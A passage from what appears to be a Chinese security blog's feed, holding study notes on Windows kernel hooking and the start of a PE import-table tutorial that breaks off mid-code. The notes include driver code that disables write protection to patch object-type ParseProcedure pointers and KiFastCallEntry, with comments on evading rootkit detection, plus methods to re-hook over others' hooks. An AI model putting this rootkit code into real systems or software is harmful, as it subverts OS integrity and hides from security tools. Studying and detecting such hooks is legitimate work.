class="type">POBJECT_TYPE</span>;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对于对象类型结构，主要的层次结构像一个树形或者说目录形。其主要的对象类型比如<em>IoFileObjectType，</em>PsProcessType，*PsThreadType。都是存在于ObjectTypes\Device。所以，只要生成对象就会创建指定的对象类型结构。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最后讲解一下关于最后一个结构体<code>OBJECT_TYPE_INITIALIZER</code>,使用<code>dt _OBJECT_TYPE_INITIALIZER</code>就可以查看<code>_OBJECT_TYPE_INITIALIZER</code>的数据。在这个结构体中，最后8个函数指针是关乎HOOK的，这些函数能够决定对象的操作，比如说打开，创建，删除等。<br>    <img src="http://hacky.wang/blog/20190515/RqnqFHLYoAdO.png?imageslim" alt="mark"></p><figure class="highlight elm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">typedef struct _OBJECT_TYPE_INITIALIZER &#123;</div><div class="line">  <span class="type">USHORT</span> <span class="type">Length</span>;</div><div class="line">  <span class="type">BOOLEAN</span> <span class="type">UseDefaultObject</span>;</div><div class="line">  <span class="type">BOOLEAN</span> <span class="type">CaseInsensitive</span>;</div><div class="line">  <span class="type">ULONG</span> <span class="type">InvalidAttributes</span>;</div><div class="line">  <span class="type">GENERIC_MAPPING</span> <span class="type">GenericMapping</span>;</div><div class="line">  <span class="type">ULONG</span> <span class="type">ValidAccessMask</span>;</div><div class="line">  <span class="type">BOOLEAN</span> <span class="type">SecurityRequired</span>;</div><div class="line">  <span class="type">BOOLEAN</span> <span class="type">MaintainHandleCount</span>;</div><div class="line">  <span class="type">BOOLEAN</span> <span class="type">MaintainTypeList</span>;</div><div class="line">  <span class="type">POOL_TYPE</span> <span class="type">PoolType</span>;</div><div class="line">  <span class="type">ULONG</span> <span class="type">DefaultPagedPoolCharge</span>;</div><div class="line">  <span class="type">ULONG</span> <span class="type">DefaultNonPagedPoolCharge</span>;</div><div class="line">  <span class="type">PVOID</span> <span class="type">DumpProcedure</span>;</div><div class="line">  <span class="type">PVOID</span> <span class="type">OpenProcedure</span>;        //这几个函数指针就是我们最需要的</div><div class="line">  <span class="type">PVOID</span> <span class="type">CloseProcedure</span>;       //这些函数都是决定你的对象的的一些</div><div class="line">  <span class="type">PVOID</span> <span class="type">DeleteProcedure</span>;      //操作或者叫方法，比如打开 创建 删除</div><div class="line">  <span class="type">PVOID</span> <span class="type">ParseProcedure</span>;       //不同的对象类型(<span class="type">OBJECT_TYPE</span>)操作也不同</div><div class="line">  <span class="type">PVOID</span> <span class="type">SecurityProcedure</span>;    </div><div class="line">  <span class="type">PVOID</span> <span class="type">QueryNameProcedure</span>;   </div><div class="line">  <span class="type">PVOID</span> <span class="type">OkayToCloseProcedure</span>;</div><div class="line">&#125; <span class="type">OBJECT_TYPE_INITIALIZER</span>, *<span class="type">POBJECT_TYPE_INITIALIZER</span>；</div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当你调用NtCreateFile-&gt;IoCreateFile-&gt;ObOpenObjectByName-&gt;ObpLookupObjectName-&gt;IopParseFile-&gt;IopParseDevice<br>IopParseFile最终也会调用IopParseDevice<br>ObjectHook其实就是比如你要HOOK 创建打开就是OBJECT_TYPE_INITIALIZER-&gt;ParseProcedure，所以ObjectHook的关键就是Hook  OBJECT_TYPE_INITIALIZER最后几个关键的函数。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;实现代码如下<br><figure class="highlight lasso"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div></pre></td><td class="code"><pre><div class="line">NTSTATUS Hook()</div><div class="line">&#123;</div><div class="line">NTSTATUS  Status;</div><div class="line"><span class="keyword">HANDLE</span> hFile;</div><div class="line">UNICODE_STRING Name;</div><div class="line">OBJECT_ATTRIBUTES Attr;</div><div class="line">IO_STATUS_BLOCK ioStaBlock;</div><div class="line">PVOID pObject = <span class="built_in">NULL</span>;</div><div class="line">RtlInitUnicodeString(&amp;Name, L<span class="string">"\\Device\\HarddiskVolume1\\1.txt"</span>);</div><div class="line">InitializeObjectAttributes(&amp;Attr,</div><div class="line">&amp;Name, </div><div class="line">OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, </div><div class="line"><span class="number">0</span>, <span class="built_in">NULL</span>);</div><div class="line">Status = ZwOpenFile(&amp;hFile,</div><div class="line">GENERIC_ALL,</div><div class="line">&amp;Attr,</div><div class="line">&amp;ioStaBlock, </div><div class="line"><span class="number">0</span>, FILE_NON_DIRECTORY_FILE);</div><div class="line"><span class="keyword">if</span> (!NT_SUCCESS(Status))</div><div class="line">&#123;</div><div class="line">KdPrint((<span class="string">"File is Null\n"</span>));</div><div class="line"><span class="keyword">return</span> Status;</div><div class="line">&#125;</div><div class="line"><span class="comment">//获取访问对象的句柄</span></div><div class="line">Status = ObReferenceObjectByHandle(hFile, GENERIC_ALL, <span class="built_in">NULL</span>, KernelMode, &amp;pObject, <span class="built_in">NULL</span>);</div><div class="line"><span class="keyword">if</span> (!NT_SUCCESS(Status))</div><div class="line">&#123;</div><div class="line">KdPrint((<span class="string">"Object is Null\n"</span>));</div><div class="line"><span class="keyword">return</span> Status;</div><div class="line">&#125;</div><div class="line">KdPrint((<span class="string">"pobject is %08X\n"</span>, pObject));</div><div class="line">addrs = OBJECT_TO_OBJECT_HEADER(pObject);<span class="comment">//获取对象头</span></div><div class="line"><span class="comment">//POBJECT_TYPE</span></div><div class="line">pType = addrs-&gt;<span class="keyword">Type</span>;<span class="comment">//获取对象类型结构 object-10h</span></div><div class="line">KdPrint((<span class="string">"pType is %08X\n"</span>, pType));</div><div class="line"><span class="comment">//保存原始地址</span></div><div class="line"><span class="comment">//POBJECT_TYPE-&gt;OBJECT_TYPE_INITIALIZER.ParseProcedure</span></div><div class="line">OldParseProcedure = pType-&gt;TypeInfo.ParseProcedure;<span class="comment">//获取服务函数原始地址OBJECT_TYPE+9C位置为打开</span></div><div class="line">KdPrint((<span class="string">"OldParseProcedure addrs is %08X\n"</span>, OldParseProcedure));</div><div class="line">KdPrint((<span class="string">"addrs is %08X\n"</span>, addrs));</div><div class="line"><span class="comment">//MDL去掉内存保护</span></div><div class="line">__asm</div><div class="line">&#123;</div><div class="line">cli;</div><div class="line">mov eax, cr0;</div><div class="line"><span class="literal">and</span> eax, <span class="literal">not</span> <span class="number">10000</span>h;</div><div class="line">mov cr0, eax;</div><div class="line">&#125;</div><div class="line"><span class="comment">//hook</span></div><div class="line">pType-&gt;TypeInfo.ParseProcedure = NewParseProcedure;</div><div class="line">__asm</div><div class="line">&#123;</div><div class="line">mov eax, cr0;</div><div class="line"><span class="literal">or</span> eax, <span class="number">10000</span>h;</div><div class="line">mov cr0, eax;</div><div class="line">sti;</div><div class="line">&#125;</div><div class="line">Status = ZwClose(hFile);</div><div class="line"><span class="keyword">return</span> Status;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><ul><li>本文作者：<ul><li><a href="https://blog.csdn.net/whatday/article/details/13626947" target="_blank" rel="external">https://blog.csdn.net/whatday/article/details/13626947</a></li><li><a href="http://www.blogfshare.com/object-hook.html" target="_blank" rel="external">http://www.blogfshare.com/object-hook.html</a></li><li><a href="https://www.write-bug.com/article/2136.html" target="_blank" rel="external">https://www.write-bug.com/article/2136.html</a></li><li><a href="https://bbs.pediy.com/thread-203767.htm" target="_blank" rel="external">https://bbs.pediy.com/thread-203767.htm</a></li></ul></li></ul><h1 id="0x7-sysenterHook"><a href="#0x7-sysenterHook" class="headerlink" title="0x7 sysenterHook"></a>0x7 sysenterHook</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sysenter是由目态进入管态的CPU支持的快速系统调用的一条指令。在此之前，系统的切换是使用<code>int 0x2E</code>系统中断实现的。但是这样做的弊端是操作是非原子的，因为要进行大量的栈切换，需要多次访问内存。所以在后来使用了新的切换指令—<code>sysenter/sysexit</code>。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;因为sysenter的原子性，这决定了管态和目态的无论是堆栈还是指令上的切换都是可以通过一条指令来实现，当然，同时，CPU也为其配备了相对应的寄存器。分别是<code>SYSENTER_CS_MSR:0x174</code>,<code>SYSENTER_ESP_MSR:0x175</code>,<code>SYSENTER_EIP_MSR:0x176</code>。并且我们可以通过rdmsr和wrmsr进行读写这三个寄存器。由于CS和EIP可以决定程序的流程，所以我们如何修改了SYSENTER_CS_MSR和SYSENTER_EIP_MSR的数据，将流程劫持到我们想要的路径，这样就实现了一次Hook。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Hook流程大概是这样的<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">_asm</div><div class="line">&#123;</div><div class="line"><span class="comment">//读取IA32_SYSENTER_EIP</span></div><div class="line"><span class="keyword">mov</span> ecx, 0x176</div><div class="line">rdmsr</div><div class="line"><span class="comment">//保存原始数据</span></div><div class="line"><span class="comment">//作用无非有二，第一为了回调该函数，第二为了卸载Hook的时候方便恢复。</span></div><div class="line"><span class="keyword">mov</span> d_origKiFastCallEntry eax</div><div class="line"><span class="comment">//Hook</span></div><div class="line"><span class="keyword">mov</span> eax,MyKiFastCallEntry</div><div class="line">wrmsr</div><div class="line">&#125;</div><div class="line"><span class="comment">//摘录自：https://bbs.pediy.com/thread-60247.htm</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;但是上面的方法直接修改寄存器数据，这样容易被Hook检测工具检测，一般检测工具对于常见sysenterHook检测基于寄存器的值是否超过本模块范围，对于InlineHook一般检测函数起始数据是否是0xE9，然后检测后面的地址是否超过当前模块范围。如果我们使用FF25这类的转移指令，这样是不容易被察觉的。起始接下来的方法并不是严格意义上的sysenterHook,更像是属于InlineHook。<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line">OID HookSysenter()</div><div class="line">&#123;</div><div class="line">UCHAR  cHookCode[<span class="number">8</span>] = &#123; <span class="number">0x57</span>,          <span class="comment">//push edi       第一跳,从KiFastCall跳到MyKiFastCallEntry.并绕过rootkit检测工具检测</span></div><div class="line">    <span class="number">0xBF</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,  <span class="comment">//mov  edi,0000  0000需要被填充</span></div><div class="line"><span class="number">0xFF</span>,<span class="number">0xE7</span> &#125;;   <span class="comment">//jmp  edi</span></div><div class="line">UCHAR  JmpCode[] = &#123;<span class="number">0xE9</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;       <span class="comment">//jmp 0000 第三跳,从KiFastCall函数头代码跳转到原来KiFastCall+N</span></div><div class="line">int    nCopyLen = <span class="number">0</span>;</div><div class="line">int    nPos = <span class="number">0</span>;</div><div class="line"><span class="comment">//得到KiFastCallEntry地址</span></div><div class="line"><span class="comment">//但是也存在使用rdmsr读取的IP并不是KiFastCallEntry地址</span></div><div class="line">ULONG uSysenter=NULL;</div><div class="line">__asm &#123;</div><div class="line">mov ecx, <span class="number">0x176</span></div><div class="line">rdmsr</div><div class="line">mov uSysenter, eax  </div><div class="line">&#125;</div><div class="line">DbgPrint(<span class="string">"sysenter:0x%08X"</span>, uSysenter);</div><div class="line"><span class="comment">//我们要改写的函数头至少需要8字节 这里计算实际需要COPY的代码长度 因为我们不能把一条完整的指令打断</span></div><div class="line">nPos = uSysenter;</div><div class="line">while (nCopyLen &lt; <span class="number">8</span>) &#123;</div><div class="line">nCopyLen += GetOpCodeSize((PVOID)nPos);  </div><div class="line">nPos = uSysenter + nCopyLen;</div><div class="line">&#125;</div><div class="line"><span class="comment">//保存原是的前八个字节代码</span></div><div class="line">ULONG uOrigSysenterHead[<span class="number">8</span>];</div><div class="line">DbgPrint(<span class="string">"copy code lenght:%d"</span>, nCopyLen);</div><div class="line">PVOID pMovedSysenterCode = ExAllocatePool(NonPagedPool, <span class="number">20</span>);</div><div class="line">memcpy(uOrigSysenterHead, (PVOID)uSysenter, <span class="number">8</span>);</div><div class="line"><span class="comment">//计算跳转地址</span></div><div class="line">*((ULONG*)(JmpCode + <span class="number">1</span>)) = (uSysenter + nCopyLen) - ((ULONG)pMovedSysenterCode + nCopyLen) - <span class="number">5</span>;</div><div class="line"><span class="comment">//保存函数其实不妨原始数据</span></div><div class="line">memcpy(pMovedSysenterCode, (PVOID)uSysenter, nCopyLen); </div><div class="line"><span class="comment">//把跳转代码COPY上去</span></div><div class="line">memcpy((PVOID)(pMovedSysenterCode + nCopyLen), JmpCode, <span class="number">5</span>); </div><div class="line"><span class="comment">//HOOK地址，其实填充的是第二条语句的地址，其实就是InlineHook(A)</span></div><div class="line">*((ULONG*)(cHookCode + <span class="number">2</span>)) = (ULONG)MyKiFastCallEntry; </div><div class="line">DbgPrint(<span class="string">"Saved sysenter code:0x%08X"</span>, pMovedSysenterCode);</div><div class="line">DbgPrint(<span class="string">"MyKiFastCallEntry:0x%08X"</span>, MyKiFastCallEntry);</div><div class="line">__asm &#123;</div><div class="line">cli</div><div class="line">mov  eax, cr0</div><div class="line">and  eax, not <span class="number">10000</span>h</div><div class="line">mov  cr0, eax</div><div class="line">&#125;</div><div class="line">memcpy((PVOID)uSysenter, cHookCode, <span class="number">8</span>);<span class="comment">//把改写原来函数头</span></div><div class="line">__asm &#123;</div><div class="line">mov  eax, cr0</div><div class="line">or eax, <span class="number">10000</span>h</div><div class="line">mov  cr0, eax</div><div class="line">sti</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="comment">//摘录自https://bbs.pediy.com/thread-42705.htm</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;但是，<strong>rdmsr对于的IP地址并不一定是KiFastCallEntry，按道理来说其地址应该是KiFastCallEntry，但是我的机器上显示的不是！看看哪位师傅可以给解释一下</strong><br><figure class="highlight maxima"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="number">0</span>: kd&gt; rdmsr <span class="number">176</span></div><div class="line">msr[<span class="number">176</span>] = <span class="number">00000000</span>`<span class="number">80542520</span></div><div class="line"><span class="number">0</span>: kd&gt; u <span class="number">80542520</span></div><div class="line">nt!KeReleaseInStackQueuedSpinLockFromDpcLevel+<span class="number">0xa78</span>:</div><div class="line"><span class="number">80542520</span> b923000000      mov     ecx,23h</div><div class="line"><span class="number">80542525</span> 6a30            <span class="built_in">push</span>    30h</div><div class="line"><span class="number">80542527</span> <span class="number">0fa1</span>            <span class="built_in">pop</span>     fs</div><div class="line"><span class="number">80542529</span> 8ed9            mov     ds,cx</div><div class="line">8054252b 8ec1            mov     es,cx</div><div class="line">8054252d 648b0d40000000  mov     ecx,dword ptr fs:[40h]</div><div class="line"><span class="number">80542534</span> <span class="number">8b6104</span>          mov     esp,dword ptr [ecx+<span class="number">4</span>]</div><div class="line"><span class="number">80542537</span> 6a23            <span class="built_in">push</span>    23h</div></pre></td></tr></table></figure></p><ul><li>本文作者<ul><li><a href="https://bbs.pediy.com/thread-60247.htm" target="_blank" rel="external">https://bbs.pediy.com/thread-60247.htm</a></li><li><a href="https://bbs.pediy.com/thread-42705.htm" target="_blank" rel="external">https://bbs.pediy.com/thread-42705.htm</a></li></ul></li></ul><h1 id="0x8-相关事项"><a href="#0x8-相关事项" class="headerlink" title="0x8 相关事项"></a>0x8 相关事项</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这一部分主要讲一下Hook的注意事项和部分大厂关于Hook的面经。部分面经之前讲解了，在这里不做赘述。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先是二次HOOK，就是被别人HOOK了之后自己再次HOOK，这里可以提供4种方法，第一可以<strong>换个位置HOOK</strong>。<strong>第二就是替换原HOOK</strong>，也就是说将别人HOOK的指令修改为自己HOOK的指令。这样应该是比较有效的，但是需要注意的是修改指令数量一定要和对方的一致，或者修改之前将原来的HOOK还原，不然容易产生错误。<strong>第三，在Detour函数中HOOK</strong>，<strong>第四，在Target函数中的原来HOOK的地址后面HOOK</strong>。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第二是X64下HOOK应该注意什么？首先X64和X86本质区别就是地址总线上的差别，一个是2^64次，一次传输64位数据，一个是2^32次，一次传输32位数据。由此造成的差异就是内存地址大小问题，在32位机器上主要是4个字节，64位机器上就变成了8个字节。这样的话对于指针的使用就需要考虑到两个架构上的兼容性和差异性。例如在32下可以使用ULONG，但是在64位下使用ULONG_PTR。这样就可以有效避免由于编码问题产生的异常(或者统一使用ULONG_PTR)。第二就是PE格式上，由于x86和x64PE结构上存在微小差异，所以在进行AddressHook的时候需要注意。<strong>第三可能涉及到跳转的问题</strong>。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由于地址长度导致跳转指令长度变化。想mov-jmp就需要利用2+8+2的长度进行跳转，又像push-ret的方法，在32位系统下直接push就是32位数据，但是64位下只能push32位数据，这样的话，只能先push低位数据，然后修改高位数据，例如这样：<code>push 55667788h;mov [esp+4],11223344</code>。再如使用jmp[addr]方法。FF25类型jmp在X86平台下是一种绝对偏移的跳转，但是在x64下也是一种相对偏移的跳转。计算公式为当前EIP+0x6(指令长度)</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;检测HOOK：</p><ul><li>1.HOOK修改的是内存中的数据，本地文件却没有修改。可以将本地文件加载到内存中，然后进行对比</li><li>2.对内存模块进行CRC校验</li><li>3.设置回调函数，检测某个IAT或者函数的前几个指令是否被修改</li><li>4.对VirtualProtect函数和WriteProcess函数进行HOOK，检测修改内容的合法性</li><li>5.利用PsSetCreateProcessNotifyRoutineEx注册回调函数，监控进程创建，对比特定的进程，如果创建，设置创建标志为假，创建失败</li><li>6.利用PsSetCreateThreadNotifyRoutine注册回调函数，监控线程创建，通过进程路径.找到对应进程名.判断是否符合，如果是的话.找到回调函数地址( pWin32Address = <em>(UCHAR**)((UCHAR</em>)Thread + 0x410);)并改为C3</li><li>7.利用PsSetLoadImageNotifyRoutine拦截模块，首先需要获取模块基地址(让其载入)，PE寻找基地址，解析到OEP，修改oep为ret即可</li><li><a href="https://bbs.pediy.com/thread-224514.htm" target="_blank" rel="external">https://bbs.pediy.com/thread-224514.htm</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;0x0-前言&quot;&gt;&lt;a href=&quot;#0x0-前言&quot; class=&quot;headerlink&quot; title=&quot;0x0 前言&quot;&gt;&lt;/a&gt;0x0 前言&lt;/h1&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;
      
    
    </summary>
    
      <category term="windows安全" scheme="http://yoursite.com/categories/windows%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>一篇文章带你理解PE三表</title>
    <link href="http://yoursite.com/2019/04/18/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3PE%E4%B8%89%E8%A1%A8/"/>
    <id>http://yoursite.com/2019/04/18/一篇文章带你理解PE三表/</id>
    <published>2019-04-18T07:02:11.000Z</published>
    <updated>2019-04-21T07:10:33.664Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;刚刚结束春招，投了好几家公司，结果不是很理想，原因无外乎自身实力和行业寒冬。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这次春招面试题主要集中在PE相关，HOOK技术和DLL注入技术，还有一些杂七杂八的问题上面。从中也暴露处自己技能栈上的不足，通过这一段时间的沉淀希望可以补足。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;四月初就开始谋划写一系列的文章，但是加上在校实习比较忙碌，所以进展很慢，这些文章主要面向受众是那些入坑新人，借此希望能够让那些小伙伴能够少走弯路。同时也能多多总结自身的不足，共同进步。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这系列文章取啥名？想了很久，决定参考某一师傅的系列文章—&lt;一篇文章带你·····&gt;,主要希望总结PE文件，HOOK,DLL注入，以及其他方面的知识，主要的参考文献是看雪<strong>加密解密第四版</strong>，以及其他资料。(打了广告，希望相关师傅记得打点广告费)</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这系列是我边总结技术边写文章，可能部分内容会以后补全技能栈，例如R0下的DLL注入等。<strong>但是尽量做到不鸽</strong>，关于代码，不提供自己写的代码，原因有二，第一，这些代码网上都有现成的，我只是理解修改部分罢了，也怕自己的代码误导小伙伴们。<strong>第二，拒绝伸手党</strong>。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由于自身能力有限，文章中难免出现错误，希望各位师傅少喷我。</p><h1 id="0x1-PE导入表"><a href="#0x1-PE导入表" class="headerlink" title="0x1 PE导入表"></a>0x1 PE导入表</h1><h2 id="0x1-1-输入函数的调用"><a href="#0x1-1-输入函数的调用" class="headerlink" title="0x1.1 输入函数的调用"></a>0x1.1 输入函数的调用</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DLL动态链接库文件主要实现代码的复用。当一个程序调用DLL文件中的数据和代码的时候，有两种链接方式，第一种是<strong>隐式链接</strong>，这个过程是由windows装载器完成的，另外一种是<strong>显式链接</strong>，通过使用LoadLibrary和GetProcAddress这两个API函数实现的。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当隐式的调用一个API函数的时候，同样也存在类似于LoadLibrary和GetProcAddress函数的功能实现，但是，这个操作是由windows装载器完成的，所以称为<strong>隐式链接</strong>，当程序使用隐式链接调用DLL代码的时候，装载器需要完成以下几个步骤(IAT填充):</p><ul><li>首先将所需要的DLL文件载入内存，Kernel32.dll等是通过映射的方式载入的</li><li>定位IID，寻找IID的第四个字段Name。</li><li>接着根据OrginalFirstThunk指向，获取INT。</li><li>根据INT执行的IMAGE_IMPORT_BY_NAME结构获取函数名称</li><li>利用类似于GetProcAddress函数功能的操作，获取函数地址VA</li><li>将获取的API函数地址填充入IAT。</li><li>断链，将FirstThunk断开</li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;程序一般使用CALL-JMP的方式调用API方式，显然，这种方式是低效的，不然直接使用CALL高效，之所以使用这种方式，因为编译器无法判断哪些调用是API，哪些调用是普通函数。JMP的地址其实是IAT所在的地址VA。</p><h2 id="0x1-2-导入表结构"><a href="#0x1-2-导入表结构" class="headerlink" title="0x1.2 导入表结构"></a>0x1.2 导入表结构</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在PE文件可选头中，数据目录项的第一个成员指向的导入表。可以看到2040是一个RVA，这是在内存中的偏移量。我们需要将它转化为文件偏移。<br>    <img src="https://ws3.sinaimg.cn/large/005BYqpgly1g26qg7gjykj30ik01rq2p.jpg" alt=""></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们可以看到2040位于.rdata段中。可以使用公式<strong>section[i].PointOfRawData+(offset-VirtuallAddress)</strong>来计算文件偏移。计算出来的文件偏移为600+(2040-2000)=640.也就是说PE导入表在文件中640H的地方。<br>    <img src="https://i.loli.net/2019/04/18/5cb8139b7a014.png" alt=""></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;同样的，我们可以使用代码实现这一个需求，代码如下：</p><ul><li>0.定位第一个节区地址</li><li>1.获取节区数目</li><li>2.判断RVA在那个节区</li><li>3.计算:section[i].PointOfRawData+(offset-VirtuallAddress)<figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">DWORD RvaToOffset(DWORD ImageAddr, LPVOID lpBaseAddress)</div><div class="line">&#123;</div><div class="line"><span class="regexp">//</span>NtHeader</div><div class="line">PIMAGE_NT_HEADERS pNtHeaders = <span class="function"><span class="params">(PIMAGE_NT_HEADERS)((ULONG_PTR)lpBaseAddress + ((PIMAGE_DOS_HEADER)lpBaseAddress)-&gt;e_lfanew)</span>;</span></div><div class="line"><span class="function">//获取第一个节区的RawtoData</span></div><div class="line"><span class="function">PIMAGE_SECTION_HEADER pSectionHeader = <span class="params">(PIMAGE_SECTION_HEADER)(((ULONG_PTR)&amp;pNtHeaders-&gt;OptionalHeader) + pNtHeaders-&gt;FileHeader.SizeOfOptionalHeader)</span>;</span></div><div class="line"><span class="function">if <span class="params">(ImageAddr &gt; pNtHeaders-&gt;OptionalHeader.SizeOfImage)</span></span></div><div class="line"><span class="function">&#123;</span></div><div class="line"><span class="function">printf<span class="params">(<span class="string">"ImageAddr Is Error\n"</span>)</span>;</span></div><div class="line"><span class="function">return NULL;</span></div><div class="line"><span class="function">&#125;</span></div><div class="line"><span class="function">if <span class="params">(ImageAddr &lt; pSectionHeader[<span class="number">0</span>].PointerToRawData)</span></span></div><div class="line"><span class="function">&#123;</span></div><div class="line"><span class="function">return ImageAddr;</span></div><div class="line"><span class="function">&#125;</span></div><div class="line"><span class="function">DWORD i = 0;</span></div><div class="line"><span class="function">for <span class="params">(i = <span 